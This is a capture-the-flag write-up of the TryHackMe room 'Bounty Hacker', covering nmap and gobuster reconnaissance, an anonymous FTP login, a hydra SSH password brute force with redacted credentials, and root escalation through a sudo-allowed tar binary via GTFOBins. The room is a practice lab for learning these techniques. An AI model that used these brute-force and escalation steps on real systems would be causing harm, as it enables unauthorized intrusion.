@@ -1,0 +1,156 @@
+This is a write of the easy rated THM room Bounty Hacker
+
+You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future!
+
+It's a pretty fun intro to the CTF. Lets enjoy this game together.
+
+So it's a hack so we're going to start with a classic nmap scan using my preferred scans.
+
+nmap -sS -sV -vv -A 10.10.39.227
+
+and we got (only pertinent info)
+
+PORT      STATE  SERVICE         REASON         VERSION
+20/tcp    closed ftp-data        reset ttl 63
+21/tcp    open   ftp             syn-ack ttl 63 vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.9.1.148
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp    open   ssh             syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgcwCtWTBLYfcPeyDkCNmq6mXb/qZExzWud7PuaWL38rUCUpDu6kvqKMLQRHX4H3vmnPE/YMkQIvmz4KUX4H/aXdw0sX5n9jrennTzkKb/zvqWNlT6zvJBWDDwjv5g9d34cMkE9fUlnn2gbczsmaK6Zo337F40ez1iwU0B39e5XOqhC37vJuqfej6c/C4o5FcYgRqktS/kdcbcm7FJ+fHH9xmUkiGIpvcJu+E4ZMtMQm4bFMTJ58bexLszN0rUn17d2K4+lHsITPVnIxdn9hSc3UomDrWWg+hWknWDcGpzXrQjCajO395PlZ0SBNDdN+B14E0m6lRY9GlyCD9hvwwB
+|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMCu8L8U5da2RnlmmnGLtYtOy0Km3tMKLqm4dDG+CraYh7kgzgSVNdAjCOSfh3lIq9zdwajW+1q9kbbICVb07ZQ=
+|   256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqmJn+c7Fx6s0k8SCxAJAoJB7pS/RRtWjkaeDftreFw
+80/tcp    open   http            syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+990/tcp   closed ftps            reset ttl 63
+40193/tcp closed unknown         reset ttl 63
+40911/tcp closed unknown         reset ttl 63
+41511/tcp closed unknown         reset ttl 63
+42510/tcp closed caerpc          reset ttl 63
+44176/tcp closed unknown         reset ttl 63
+44442/tcp closed coldfusion-auth reset ttl 63
+44443/tcp closed coldfusion-auth reset ttl 63
+44501/tcp closed unknown         reset ttl 63
+45100/tcp closed unknown         reset ttl 63
+48080/tcp closed unknown         reset ttl 63
+49152/tcp closed unknown         reset ttl 63
+49153/tcp closed unknown         reset ttl 63
+49154/tcp closed unknown         reset ttl 63
+49155/tcp closed unknown         reset ttl 63
+49156/tcp closed unknown         reset ttl 63
+49157/tcp closed unknown         reset ttl 63
+49158/tcp closed unknown         reset ttl 63
+49159/tcp closed unknown         reset ttl 63
+49160/tcp closed unknown         reset ttl 63
+49161/tcp closed unknown         reset ttl 63
+49163/tcp closed unknown         reset ttl 63
+49165/tcp closed unknown         reset ttl 63
+49167/tcp closed unknown         reset ttl 63
+49175/tcp closed unknown         reset ttl 63
+49176/tcp closed unknown         reset ttl 63
+49400/tcp closed compaqdiag      reset ttl 63
+49999/tcp closed unknown         reset ttl 63
+50000/tcp closed ibm-db2         reset ttl 63
+OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
+Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Linux 2.6.32 - 3.1 (90%), Infomir MAG-250 set-top box (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Linux 3.7 (90%), Linux 5.0 (90%), Linux 5.1 (90%), Ubiquiti AirOS 5.5.9 (90%), Linux 5.0 - 5.4 (89%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.91%E=4%D=5/5%OT=21%CT=20%CU=%PV=Y%DS=2%DC=T%G=N%TM=6092F5EF%P=x86_64-pc-linux-gnu)
+SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
+OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)
+WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
+ECN(R=Y%DF=Y%TG=40%W=F507%O=M506NNSNW7%CC=Y%Q=)
+T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+T6(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=N)
+U1(R=N)
+IE(R=Y%DFI=N%TG=40%CD=S)
+
+The interesting ports I see from the get go is ftp, ssh and http
+	So I'm going to run gobuster scan to see whats on the website.
+
+gobuster dir -u http://10.10.39.227 -w /usr/share/wordlists/dirb/common.txt
+
+===============================================================
+2021/05/05 21:49:16 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/images               (Status: 301) [Size: 313] [--> http://10.10.39.227/images/]
+/index.html           (Status: 200) [Size: 969]                                  
+/server-status        (Status: 403) [Size: 277]                                  
+                                                                                 
+===============================================================
+2021/05/05 21:50:43 Finished
+===============================================================
+
+Cool so this tells us nothing super useful at the moment so I'm going to take a look at the ftp port.
+
+ftp -p 10.10.39.227 21
+	As its ftp the username anonymous allows us to connect.
+
+Annoyingly I was logged in in passive mode so just type in the command "passive" to turn it off
+Then i get the files we can see in the ftp site. One is locks and the other is tasks. In the tasks file we can see the answer to the next question for the room.
+
+Looking at locks.txt it seems a lot like a file of passwords. So It's time for ssh i think
+	(And BTW the answer to the next question is in the above info)
+
+So we have a username from the tasks file and a file that seems to be full of passwords. So with hydra we can brute force the credentials for ssh
+	hydra -l lin -P locks.txt 10.10.39.227 -t 4 ssh
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-05 22:05:39
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
+[DATA] attacking ssh://10.10.39.227:22/
+[22][ssh] host: 10.10.39.227   login: REDACTED   password: REDACTED
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-05 22:05:48
+
+We have the credentials now so we can ssh into the machine.
+	And bing bang boom we're in.
+
+The first flag is right there for us as we connect
+	cat user.txt
+
+Now we need to work on privledge escalation to get to the root flag
+
+sudo -l shows us (sudo password is the same we used to ssh in)
+
+Matching Defaults entries for lin on bountyhacker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on bountyhacker:
+    (root) /bin/***
+
+So off to gtfo bins to see if /bin/*** can allow us to escalate to root
+
+Now we can find the tar section of the gtfobins and run the command under the sudo header. That allows us to maintain root privledges.
+
+With these privledges we can read the /root/root.txt flag
+
+Hope you enjoyed this CTF as much as I did and have a good day.
